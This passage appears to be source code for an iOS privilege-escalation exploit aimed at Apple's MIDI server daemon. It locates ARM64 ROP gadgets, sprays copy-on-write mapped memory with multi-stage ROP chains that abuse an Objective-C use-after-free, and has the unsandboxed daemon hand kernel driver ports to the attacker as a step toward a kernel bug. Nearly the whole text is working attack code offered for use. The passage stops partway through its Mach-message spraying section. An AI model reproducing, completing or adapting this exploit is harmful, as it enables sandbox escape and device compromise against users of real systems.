//
//  UHAK_final_exp.c
//  UHAK_final
//
//  Created by aa on 5/11/19.
//  Copyright © 2019 aa. All rights reserved.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <pthread/pthread.h>
#include <copyfile.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreMIDI/CoreMIDI.h>
#include <sys/time.h>

#define printf(X,X2...) {}

#define printf_wow(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define print_line(X) {extern void log_toView(const char *input_cstr);log_toView(X);}

#define TARGET_MACH_SERVICE "com.apple.midiserver"
#define TARGET_MACH_SERVICE_2 "com.apple.midiserver.io"
#define SPRAY_ADDRESS 0x29f000000
#define EXTENDED_ROP_ADDRESS 0x29f002000
#define EXTENDED_ROP_SIZE 0x5000

#define OF(offset) (offset)/sizeof(uint64_t)
#define exit(X) longjmp(jmpb, 1)

jmp_buf jmpb;

#pragma mark - Expose External API

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);

#pragma mark - Pre-exploitation - dyldcache

void *dylibcache_start = NULL;
size_t dylibcache_size = 0;

bool isPartOf_dyldcache(vm_address_t addr){
    vm_size_t size = 0;
    natural_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    if(vm_region_recurse_64(mach_task_self(), &addr, &size, &depth, (vm_region_info_t)&info, &info_cnt))
        return false;
    if(info.share_mode == SM_TRUESHARED)
        return true;
    return false;
}

size_t Get_loaded_dylib_size(void *dylib_address){
    struct mach_header *mh = (struct mach_header*)dylib_address;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)((char*)mh+sizeof(struct mach_header_64));
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SEGMENT_64:{
                struct segment_command_64 *seg = (struct segment_command_64*)cmd;
                if(!strcmp(seg->segname,"__TEXT")){
                    return seg->vmsize;
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    return 0;
}

void Find_dylibcache(){
    
    vm_address_t minAddr = 0;
    vm_address_t maxAddr = 0;
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        if(strncmp(name, "/System/", 8) && strncmp(name, "/usr/", 5))
            continue;
        if(!isPartOf_dyldcache(addr))
            continue;
        if(!minAddr || addr < minAddr)
            minAddr = addr;
        if(addr > maxAddr)
            maxAddr = addr;
    }
    
    if(!minAddr||!maxAddr){
        printf("dylibcache Not Ready!\n");
        exit();
    }
    
    size_t last_dylib_size = Get_loaded_dylib_size((void*)maxAddr);
    
    dylibcache_start = (void*)minAddr;
    dylibcache_size = (size_t)((maxAddr + last_dylib_size) - minAddr);
    
    printf("Dylibcache range: %p - %p\n", dylibcache_start, dylibcache_start + dylibcache_size);
}

#pragma mark - Pre-exploitation - arm64 ROP gadgets

uint64_t find_gadget(char *bytes, size_t len){
    void *addr = memmem(dylibcache_start, dylibcache_size, bytes, len);
    if(!addr){
        printf("Gadget didn't find, len:0x%zx\n",len);
        exit();
    }
    return (uint64_t)addr;
}

// ldr x0, [x0] ; ldr x8, [x0] ; ldr x1, [x8, #0x38] ; br x1
#define _ROP_StackControl_PRIOR_1 find_gadget((char[]){0x00,0x00,0x40,0xF9,0x08,0x00,0x40,0xF9,0x01,0x1D,0x40,0xF9,0x20,0x00,0x1F,0xD6,},16)
uint64_t ROP_StackControl_PRIOR_1 = 0;

// ldr x1, [x0, #0x48] ; ldr x0, [x0, #0x30] ; br x1
#define _ROP_StackControl_1  find_gadget((char[]){0x01,0x24,0x40,0xF9,0x00,0x18,0x40,0xF9,0x20,0x00,0x1F,0xD6},12)
uint64_t ROP_StackControl_1 = 0;

// ldr x4, [x0] ; ldr x4, [x4, #0x30] ; str x0, [sp] ; blr x4
#define _ROP_StackControl_2 find_gadget((char[]){0x04,0x00,0x40,0xF9,0x84,0x18,0x40,0xF9,0xE0,0x03,0x00,0xF9,0x80,0x00,0x3F,0xD6,},16)
uint64_t ROP_StackControl_2 = 0;

// ldp x29, x30, [sp], #0x10 ; br x17
#define _ROP_StackControl_3 find_gadget((char[]){0xFD,0x7B,0xC1,0xA8,0x20,0x02,0x1F,0xD6},8)
uint64_t ROP_StackControl_3 = 0;

// mov sp, x29 ; ldp x29, x30, [sp], #0x10 ; ret
// ROP_setX5 + 12
uint64_t ROP_StackControl_5End = 0;

// mov x0, x23 ; mov x1, x22 ; mov x2, x21 ; mov x3, x20 ; mov x4, x19 ; ldp x29, x30, [sp, #0x30] ; ldp x20, x19, [sp, #0x20] ; ldp x22, x21, [sp, #0x10] ; ldp x24, x23, [sp], #0x40 ; br x5
#define _ROP_5argsCall_brX5  find_gadget((char[]){ 0xE0,0x03,0x17,0xAA,0xE1,0x03,0x16,0xAA,0xE2,0x03,0x15,0xAA,0xE3,0x03,0x14,0xAA,0xE4,0x03,0x13,0xAA,0xFD,0x7B,0x43,0xA9,0xF4,0x4F,0x42,0xA9,0xF6,0x57,0x41,0xA9,0xF8,0x5F,0xC4,0xA8,0xA0,0x00,0x1F,0xD6},40)
uint64_t ROP_5argsCall_brX5 = 0;

// ldp x5, x6, [sp], #0x10 ; ldp x3, x4, [sp], #0x10 ; ldp x1, x2, [sp], #0x10 ; mov sp, x29 ; ldp x29, x30, [sp], #0x10 ; ret
#define _ROP_setX5 find_gadget((char[]){0xE5,0x1B,0xC1,0xA8,0xE3,0x13,0xC1,0xA8,0xE1,0x0B,0xC1,0xA8,0xBF,0x03,0x00,0x91,0xFD,0x7B,0xC1,0xA8,0xC0,0x03,0x5F,0xD6},24)
uint64_t ROP_setX5 = 0;

uint64_t ChainCalling_rop_start_address = 0; //Play a role when relocating ROP mem, and that's for extending available ROP entries

#define rop_ChainCalling_init(ROPMEM_START, DATA_OFFSET) \
uint32_t rop_data_offset = (uint32_t)(DATA_OFFSET - (rop_start_address - ROPMEM_START)); \
void *rop_data = (uint64_t*)(((char*)rop_stack) + rop_data_offset); \
uint32_t chainCalling_sp = 0x60; \
rop_stack[OF(0x0)] = ROP_setX5; \
rop_stack[OF(0x18)] = ROP_5argsCall_brX5; \
rop_stack[OF(0x50)] = rop_start_address + (chainCalling_sp + 0x10);

#define rop_Insert_String(VAR, STR) \
size_t _##VAR##_len = strlen(STR) + 1; \
uint64_t VAR = rop_start_address + rop_data_offset; \
memcpy(rop_data, STR, _##VAR##_len); \
_##VAR##_len = (~0xF) & (_##VAR##_len + 0xF); \
rop_data_offset += _##VAR##_len; \
rop_data += _##VAR##_len;

#define rop_Insert_Data(VAR, DATA, SIZE) \
size_t _##VAR##_SIZE = SIZE; \
uint64_t VAR = rop_start_address + rop_data_offset; \
memcpy(rop_data, DATA, _##VAR##_SIZE); \
_##VAR##_SIZE = (~0xF) & (_##VAR##_SIZE + 0xF); \
rop_data_offset += _##VAR##_SIZE; \
rop_data += _##VAR##_SIZE;

#define rop_FuncCALL(FUNC, ARG1, ARG2, ARG3, ARG4, ARG5) \
rop_stack[OF(chainCalling_sp - 0x20)] = (uint64_t)(ARG4); /* x20 -> x3 */ \
rop_stack[OF(chainCalling_sp - 0x18)] = (uint64_t)(ARG5); /* x19 -> x4 */ \
rop_stack[OF(chainCalling_sp - 0x30)] = (uint64_t)(ARG2); /* x22 -> x1 */ \
rop_stack[OF(chainCalling_sp - 0x28)] = (uint64_t)(ARG3); /* x21 -> x2 */ \
rop_stack[OF(chainCalling_sp - 0x38)] = (uint64_t)(ARG1); /* x23 -> x0 */ \
rop_stack[OF(chainCalling_sp)] = (uint64_t)(FUNC); /* Target call */ \
rop_stack[OF(chainCalling_sp + 0x18)] = ROP_5argsCall_brX5; \
chainCalling_sp += 0x60; \
rop_stack[OF(chainCalling_sp - 0x10)] = rop_start_address + (chainCalling_sp + 0x10); /*SP after call*/ \
rop_stack[OF(chainCalling_sp - 0x8)] = ROP_setX5; /*x30 after call*/

#define rop_FuncCALL_keepLastReturn(FUNC, ARG2, ARG3, ARG4, ARG5) \
rop_stack[OF(chainCalling_sp - 0x20)] = (uint64_t)(ARG4); /* x20 -> x3 */ \
rop_stack[OF(chainCalling_sp - 0x18)] = (uint64_t)(ARG5); /* x19 -> x4 */ \
rop_stack[OF(chainCalling_sp - 0x30)] = (uint64_t)(ARG2); /* x22 -> x1 */ \
rop_stack[OF(chainCalling_sp - 0x28)] = (uint64_t)(ARG3); /* x21 -> x2 */ \
rop_stack[OF(chainCalling_sp)] = (uint64_t)(FUNC); /* Target call */ \
rop_stack[OF(chainCalling_sp + 0x18)] = (ROP_5argsCall_brX5 + 0x4); \
chainCalling_sp += 0x60; \
rop_stack[OF(chainCalling_sp - 0x10)] = rop_start_address + (chainCalling_sp + 0x10); /*SP after call*/ \
rop_stack[OF(chainCalling_sp - 0x8)] = ROP_setX5; /*x30 after call*/

/*
 通过计算偏移, 将内存拷贝到接下来的 rop call, 以做到动态修改 rop
 */

#define rop_Set_NextCall_Func(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60, COPY_FROM, 8, 0, 0);

#define rop_Set_NextCall_X0(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60-0x38, COPY_FROM, 8, 0, 0);

#define rop_Set_NextCall_X1(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60-0x30, COPY_FROM, 8, 0, 0);

#define rop_Set_NextCall_X2(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60-0x28, COPY_FROM, 8, 0, 0);

#define rop_Set_NextCall_X3(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60-0x20, COPY_FROM, 8, 0, 0);

#define rop_Set_NextCall_X4(CALLCNT_INBETW, COPY_FROM) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(CALLCNT_INBETW+1)*0x60-0x18, COPY_FROM, 8, 0, 0);

#define rop_Extend_ROPMem_dynamically(ADDR_CONTAIN_NEW_ROPMem) \
rop_FuncCALL(memcpy, rop_start_address+chainCalling_sp+(1+1)*0x60-0x10, NEW_ROPMem, 8, 0, 0); \
rop_FuncCALL(free, 0, 0, 0, 0, 0); \
rop_stack[OF(chainCalling_sp)] = ROP_StackControl_5End; /* x5 -> Target call */ \
rop_stack[OF(chainCalling_sp + 0x18)] = ROP_5argsCall_brX5; \
chainCalling_sp += 0x60; \
rop_stack[OF(chainCalling_sp - 0x10)] = 0x414141; /*SP after call, it'll get updated during the ROP*/

#define rop_Extend_ROPMem(NEW_ROPMem) \
rop_stack[OF(chainCalling_sp)] = ROP_StackControl_5End; /* x5 -> Target call */ \
rop_stack[OF(chainCalling_sp + 0x18)] = ROP_5argsCall_brX5; \
chainCalling_sp += 0x60; \
rop_stack[OF(chainCalling_sp - 0x10)] = NEW_ROPMem; /*SP after call*/

void Find_ropGadgets(){
    
#define _SEEK(V) if(!(V = _##V)){exit();}
    _SEEK(ROP_StackControl_PRIOR_1);
    _SEEK(ROP_StackControl_1);
    _SEEK(ROP_StackControl_2);
    _SEEK(ROP_StackControl_3);
    _SEEK(ROP_5argsCall_brX5);
    _SEEK(ROP_setX5);
    ROP_StackControl_5End = ROP_setX5 + 12;
}

#pragma mark - Pre-exploitation - Global Path Variables

const char *Get_ios_kernel_path(){
    const char *ios_kernel_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
    return ios_kernel_path;
}

char _tempfile1_path[256] = {0};
char *Get_tempfile1_path(){
    
    if(strlen(_tempfile1_path) != 0)
        return _tempfile1_path;
    
    confstr(_CS_DARWIN_USER_TEMP_DIR, _tempfile1_path, sizeof(_tempfile1_path));
    strcat(_tempfile1_path, "12asufh");
    return _tempfile1_path;
}

char _tempfile2_path[256] = {0};
char *Get_tempfile2_path(){
    
    //extern char *Build_itunes_path(char *filename);
    //return Build_itunes_path("kkk");
    
    if(strlen(_tempfile2_path) != 0)
        return _tempfile2_path;
    
    confstr(_CS_DARWIN_USER_TEMP_DIR, _tempfile2_path, sizeof(_tempfile2_path));
    strcat(_tempfile2_path, "OJAHj");
    return _tempfile2_path;
}

#pragma mark - Pre-exploitation - Our Mach Server

mach_port_t our_serverport = 0;
void Prepare_our_Mach_server(){
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &our_serverport);
    if(our_serverport == 0){
        printf("Error occurred when mach_port_allocate: 0x%x!\n", kr);
        exit();
    }
}

#pragma mark - Pre-exploitation - Construct ROP

void *Build_IOMatching_dictionary(char *io_service_name, size_t *out_size, uint64_t shadowp){
    
    const char *iomatch_key = "IOProviderClass";
    
    size_t key_len = strlen(iomatch_key) + 0x11;
    key_len = (~0xF) & (key_len + 0xF);
    size_t value_len = strlen(io_service_name) + 0x11;
    value_len = (~0xF) & (value_len + 0xF);
    size_t total_len = key_len + value_len + 0x70;
    
    *out_size = total_len;
    void *writep = calloc(1, total_len);
    
    char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
    char *keys[] = {realCFString};
    char *values[] = {realCFString};
    char *realCFDic = (char*)CFDictionaryCreate(0, (const void**)keys, (const void**)values, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFRetain(realCFDic);
    
    memcpy(writep, realCFDic, 0x40);
    
    writep = writep + total_len - value_len;
    shadowp = shadowp + total_len - value_len;
    uint64_t value = shadowp;
    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
    *(uint8_t*)(writep + 16) = strlen(io_service_name);
    memcpy(writep + 17, io_service_name, strlen(io_service_name));
    
    writep -= key_len;
    shadowp -= key_len;
    uint64_t key = shadowp;
    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
    *(uint8_t*)(writep + 16) = strlen(iomatch_key);
    memcpy(writep + 17, iomatch_key, strlen(iomatch_key));
    
    writep -= 0x70;
    shadowp -= 0x70;
    *(uint64_t*)(writep + 0x50) = value;
    *(uint64_t*)(writep + 0x68) = key;
    *(uint64_t*)(writep + 0x28) = shadowp + 0x50;
    *(uint64_t*)(writep + 0x30) = shadowp + 0x68;
    
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFString);
    
    return writep;
}

void Assemble_ROP4(uint64_t *rop_stack, uint64_t rop_start_address){
    /*
     ROP(4) - final core payload
     
     These tasks must be done:
     - Open vulnerable IO device, pass handler to us
     
     */
    
    // Update x29/x30 to meet chain-calling require
    rop_stack[OF(0x0)] = rop_start_address + 0x10 + 0x10;
    rop_stack[OF(0x8)] = ROP_setX5;
    
    // Initial ChainCalling envir, CALLs|DATA delimiting offset is 0x3000
    rop_start_address += 0x10;
    rop_stack = (uint64_t *)((char*)rop_stack + 0x10);
    rop_ChainCalling_init(EXTENDED_ROP_ADDRESS, 0x3000);
    
    size_t _iomatch_dic_size = 0;
    void *_iomatch_dic;
    
    // Chain-Calling officially begins here
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        // our_recv_port.name: +28
        mach_msg_port_descriptor_t our_task_port;
        // our_task_port.name: +40
        mach_msg_trailer_t trailer;
    }_remote_recvmsg = {0}; // Size: 60
    _remote_recvmsg.Head.msgh_size = sizeof(_remote_recvmsg);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        uint64_t our_data_addr;
        // our_data_addr: +24
        uint64_t our_data_len;
        // our_data_len: +32
        uint64_t remote_map_addr;
        // remote_map_addr: +40
        mach_msg_trailer_t trailer;
    }_remote_recvmsg2 = {0}; // Size: 56
    _remote_recvmsg2.Head.msgh_size = sizeof(_remote_recvmsg2);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_remote_port +8
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port_send_to_us;
        // port_send_to_us.name +28
    }_remote_sendmsg = {0};
    _remote_sendmsg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg.Head.msgh_size = sizeof(_remote_sendmsg);
    _remote_sendmsg.msgh_body.msgh_descriptor_count = 1;
    _remote_sendmsg.port_send_to_us.name = mach_task_self();
    _remote_sendmsg.port_send_to_us.disposition = MACH_MSG_TYPE_MOVE_SEND;
    _remote_sendmsg.port_send_to_us.type = MACH_MSG_PORT_DESCRIPTOR;
    
    struct {
        mach_msg_header_t Head;
    }_remote_sendmsg2 = {0};
    _remote_sendmsg2.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg2.Head.msgh_size = sizeof(_remote_sendmsg2);
    
    rop_Insert_String(remote_recvserver_name, TARGET_MACH_SERVICE_2);
    rop_Insert_Data(remote_recvmsg, &_remote_recvmsg, sizeof(_remote_recvmsg));
    rop_Insert_Data(remote_recvmsg2, &_remote_recvmsg2, sizeof(_remote_recvmsg2));
    rop_Insert_Data(remote_sendmsg, &_remote_sendmsg, sizeof(_remote_sendmsg));
    rop_Insert_Data(remote_sendmsg2, &_remote_sendmsg2, sizeof(_remote_sendmsg2));
    
    _iomatch_dic = Build_IOMatching_dictionary("AppleSPUProfileDriver", &_iomatch_dic_size, rop_start_address + rop_data_offset);
    rop_Insert_Data(iomatch_dic_AppleSPUProfileDriver, _iomatch_dic, _iomatch_dic_size);
    free(_iomatch_dic);
    _iomatch_dic = Build_IOMatching_dictionary("IOSurfaceRoot", &_iomatch_dic_size, rop_start_address + rop_data_offset);
    rop_Insert_Data(iomatch_dic_IOSurfaceRoot, _iomatch_dic, _iomatch_dic_size);
    free(_iomatch_dic);
    _iomatch_dic = Build_IOMatching_dictionary("AppleAVE2Driver", &_iomatch_dic_size, rop_start_address + rop_data_offset);
    rop_Insert_Data(iomatch_dic_AppleAVE2Driver, _iomatch_dic, _iomatch_dic_size);
    free(_iomatch_dic);
    
    // The above part is DATA use by ROP, referring to "ROP memory structure" in ROP(3)
    // followings are the actual ROP call
    
    // Set up listening port, so we can send our server port to this unsandboxed system daemon
    rop_FuncCALL(bootstrap_look_up, bootstrap_port, remote_recvserver_name, remote_recvmsg+12, 0, 0);
    rop_FuncCALL(mach_msg_receive, remote_recvmsg, 0, 0, 0, 0);
    rop_FuncCALL(memcpy, remote_recvmsg2+12, remote_recvmsg+12, sizeof(mach_port_t), 0, 0);
    rop_FuncCALL(memcpy, remote_sendmsg+8, remote_recvmsg+28, sizeof(mach_port_t), 0, 0);
    rop_FuncCALL(memcpy, remote_sendmsg2+8, remote_recvmsg+28, sizeof(mach_port_t), 0, 0);
    
    // Opening and passing kernel driver ports to us.
    rop_FuncCALL(dlsym((void*)-2, "IOServiceGetMatchingService"), 0, iomatch_dic_AppleSPUProfileDriver, 0, 0, 0);
    rop_FuncCALL_keepLastReturn(dlsym((void*)-2, "IOServiceOpen"), mach_task_self(), 0, remote_sendmsg+28, 0);
    rop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0, 0);
    
    rop_FuncCALL(dlsym((void*)-2, "IOServiceGetMatchingService"), 0, iomatch_dic_IOSurfaceRoot, 0, 0, 0);
    rop_FuncCALL_keepLastReturn(dlsym((void*)-2, "IOServiceOpen"), mach_task_self(), 0, remote_sendmsg+28, 0);
    rop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0, 0);
    
    rop_FuncCALL(dlsym((void*)-2, "IOServiceGetMatchingService"), 0, iomatch_dic_AppleAVE2Driver, 0, 0, 0);
    rop_FuncCALL_keepLastReturn(dlsym((void*)-2, "IOServiceOpen"), mach_task_self(), 0, remote_sendmsg+28, 0);
    rop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0, 0);
    
    // Waiting for overwriting over the iosurface mapping memory, key to trigger vulnerability in kernel
    rop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0, 0);
    
    rop_Set_NextCall_X0(4, remote_recvmsg+40); //set task
    rop_Set_NextCall_X1(3, remote_recvmsg2+24); //our_payload_addr
    rop_Set_NextCall_X2(2, remote_recvmsg2+32); //our_payload_size
    rop_Set_NextCall_X3(1, remote_recvmsg2+40); //remote_map_addr
    rop_FuncCALL(free, 0, 0, 0, 0, 0);
    rop_FuncCALL(vm_read_overwrite, 0x414141, 0x414141, 0x414141, 0x414141, remote_recvmsg2+32);
    
    // Notify us if copy process completed
    rop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0, 0);
    
    // Block here to waiting for finish exploitation
    rop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0, 0);
    
    // Duty completed
    rop_FuncCALL(exit, 0, 0, 0, 0, 0);
}

void Assemble_ROP3(uint64_t *rop_stack, uint64_t rop_start_address){
    
    /*
     ROP(3) -- use ool msg to extend rop length
     
     Goal is to pave the way for ROP Chain-Calling, so as to use this ability later.
     
     Here is the info of payload space consumption map, for reference when need to alter.
     Total avaiable size is only a PAGE_SIZE(0x1000)
     * Well, now device has actually updated to PAGE_SIZE(0x4000), however a extended rop still nice to have
     
     ROP Memory structure
     
     0x29f000000 ROP(1) <-- Start
     0x29f000050 ROP(2)
     0x29f000130 ROP(3) <-- ROP Chain-Calling get started here
     ...
     (Each call use up size 0x60)
     ...
     0x29f000500 <-- Start data-used offset for Chain-Calling
     ...
     0x29f001000 <-- End
     */
    
    rop_ChainCalling_init(SPRAY_ADDRESS, 0x500);
    
    struct{
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t extended_rop_payload;
        // extended_rop_payload.address: +28
        mach_msg_trailer_t trailer;
    }_remote_recvmsg = {0}; // Size is 52
    _remote_recvmsg.Head.msgh_size = sizeof(_remote_recvmsg);
    
    rop_Insert_String(remote_recvserver_name, TARGET_MACH_SERVICE_2);
    rop_Insert_Data(remote_recvmsg, &_remote_recvmsg, sizeof(_remote_recvmsg));
    
    rop_FuncCALL(bootstrap_look_up, bootstrap_port, remote_recvserver_name, remote_recvmsg+12, 0, 0);
    rop_FuncCALL(mach_msg_receive, remote_recvmsg, 0, 0, 0, 0);
    
    rop_Set_NextCall_X1(1, remote_recvmsg + 28);
    rop_FuncCALL(free, 0, 0, 0, 0, 0); // It's a Empty call, one or more call in between is must needed for rop_Set_NextCall*
    rop_FuncCALL(memcpy, EXTENDED_ROP_ADDRESS, 0x414141, EXTENDED_ROP_SIZE, 0, 0);
    // I use 0x414141 to mark that value will be dynamically updated during ROP execution
    
    // Now ROP has been extended to 0x5000, guiding execute flow to new memory
    // Proceed to Assemble_ROP4
    rop_Extend_ROPMem(EXTENDED_ROP_ADDRESS);
}

void Assemble_ROP2(uint64_t *rop2_stack, uint64_t rop2_start_address){
    
    /*
     ROP(2) -- ObjC-Object Use-After-Free
     
     Goal is to pave the way for ROP Chain-Calling
     
     libobjc.A`objc_msgSend: Initial hijacking point
     > ROP_StackControl_1: Rewrite x0, and do a jmp
     > ROP_StackControl_2: Upload x0 to [sp]
     > ROP_StackControl_3: Influence x29 with value from [sp]
     > ROP_StackControl_1: Came here by (br x17), just for ability to do a jmp
     > ROP_StackControl_5End: Take over FP(x29)
     > ROP_StackControl_5End: Take over SP (mov x30, x29), SP still needs to move forward as it dirty
     > ROP_StackControl_5End: Reset FP/SP again, both clean now
     > ROP_setX5: Get ROP Chain-Calling start
     */
    
    uint32_t rop3_start_offset = 0xE0; // Right after rop2_stack ends (Please be 1 byte aligned)
    
    // ObjC-Object components leads to PC hijack again
    rop2_stack[OF(0x0)] = rop2_start_address + 0x40;
    rop2_stack[OF(0x50)] = *rop2_stack + 0x28;
    rop2_stack[OF(0x58)] = 0;
    rop2_stack[OF(0x60)] = 0;
    rop2_stack[OF(0x68)] = ROP_StackControl_1; // Again take over PC
    rop2_stack[OF(0x70)] = (uint64_t)sel_registerName("release");
    
    // ROP_StackControl_1:
    rop2_stack[OF(0x30)] = rop2_start_address + 0x80; // Set x0, later use on overwriting x29 & SP
    rop2_stack[OF(0x48)] = ROP_StackControl_2;
    
    rop2_stack[OF(0x80)] = rop2_start_address + 0x90;
    rop2_stack[OF(0xC0)] = ROP_StackControl_3;
    
    // ROP_StackControl_1 again:
    rop2_stack[OF(0x80 + 0x30)] = 0x22222222; // Set x0  (Useless val)
    rop2_stack[OF(0x80 + 0x48)] = ROP_StackControl_5End;
    
    // ROP_StackControl_5End: as the initial point take over x29, but x5 still needs be fix for Chain-Calling
    rop2_stack[OF(0x88)] = ROP_StackControl_5End; // Jump to next gadget
    rop2_stack[OF(0x90)] = rop2_start_address + 0xD0; // Reset SP to desired value
    rop2_stack[OF(0x98)] = ROP_StackControl_5End; // Set x30 and jump by ret
    
    rop2_stack[OF(0xD0)] = rop2_start_address + rop3_start_offset + 0x10; // Prep SP for Chain-Calling
    rop2_stack[OF(0xD8)] = ROP_setX5; // Get start Chain-Calling
    
    Assemble_ROP3((void*)rop2_stack + rop3_start_offset, rop2_start_address + rop3_start_offset);
}

uint32_t cowmemlen = 0x4000; // Aligned to PAGE_SIZE, for efficiency
int cow_fd = -1;
void Prepare_cow_file_wROP(){
    void *cowmem = malloc(cowmemlen);
    bzero(cowmem, cowmemlen);
    
    uint64_t *rop_trivial = cowmem;
    
    /*
     ROP(1) -- trivial
     
     Goal is transform to a more controllable ROP envir, it's able to gain by making such call: objc_release(SPRAY_ADDRESS);
     
     X0: Point to address where contains SPRAY_ADDRESS
     X8: As the initial hijacking point, pass stage1[OF(0x10)] to PC.
     */
    
    uint32_t rop2_start_offset = 0x50; // Right after rop1_stack ends (Please be 1 byte aligned)
    
    rop_trivial[OF(0x10)] = ROP_StackControl_PRIOR_1; // Redirect X0 pointing to SPRAY_ADDRESS, then jmpto +0x38
    rop_trivial[OF(0x0)] = SPRAY_ADDRESS; //x8 = SPRAY_ADDRESS
    rop_trivial[OF(0x38)] = ROP_StackControl_1; // Make a function call
    
    rop_trivial[OF(0x48)] = (uint64_t)dlsym((void*)-2, "objc_release");
    rop_trivial[OF(0x30)] = SPRAY_ADDRESS + rop2_start_offset;
    
    // Turn into more familiar ObjC-Object Use-After-Free situation
    Assemble_ROP2(cowmem + rop2_start_offset, SPRAY_ADDRESS + rop2_start_offset);
    
    for(unsigned long i=PAGE_SIZE; i<cowmemlen; i=i+PAGE_SIZE){
        memcpy(cowmem + i, cowmem, PAGE_SIZE);
    }
    
    char *cow_fpath = Get_tempfile1_path();
    
    remove(cow_fpath);
    FILE *cow_fp = fopen(cow_fpath, "wb");
    fwrite(cowmem, 1, cowmemlen, cow_fp);
    fclose(cow_fp);
    free(cowmem);
    
    cow_fd = open(cow_fpath, O_RDONLY);
}

mach_vm_address_t mapEnd = 0;
void Map_file_intoMem(){
    //Use COW + Mapping technique to distribute large scale continuous memory
    
    mach_vm_address_t iteration = SPRAY_ADDRESS;
    mach_vm_address_t mapBegin = iteration;
    
    for(int i=0;; i++){
        if(mmap((void*)iteration, cowmemlen, PROT_READ, MAP_FIXED|MAP_SHARED, cow_fd, 0) == (void*)-1)
            break;
        mapEnd = iteration += cowmemlen;
    }
    
    if(mapEnd == 0){
        printf("Map file into mem error!\n");
    }
    
    printf("Mapping range: 0x%llx - 0x%llx\n", mapBegin, mapEnd);
}

#pragma mark - Exploitation - Common

mach_port_t midi_bsport = 0;
mach_port_t midiIo_bsport = 0;

mach_port_t Retrieve_midi_port(){
    if(midi_bsport)
        return midi_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE, &midi_bsport);
    if(!midi_bsport){
        printf("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE);
        exit(1);
    }
    return midi_bsport;
}

mach_port_t Retrieve_midiIo_port(){
    if(midiIo_bsport)
        return midiIo_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE_2, &midiIo_bsport);
    if(midiIo_bsport == 0){
        printf("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE_2);
        exit(1);
    }
    return midiIo_bsport;
}

void useless_notify(const MIDINotification *message, void * __nullable refCon){
}

CFStringRef bunchkeys[300];
void Prepare_bunch_keys(){
    char _str[10];
    for(int i=0; i<sizeof(bunchkeys)/sizeof(bunchkeys[0]); i++){
        snprintf(_str, sizeof(_str), "A%d", i);
        bunchkeys[i] = CFStringCreateWithCString(kCFAllocatorDefault, _str, kCFStringEncodingASCII);
    }
}

#pragma mark - Exploitation - Initial Mach Messages

struct MIGSender_spray{
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_descriptor_t ool;
};
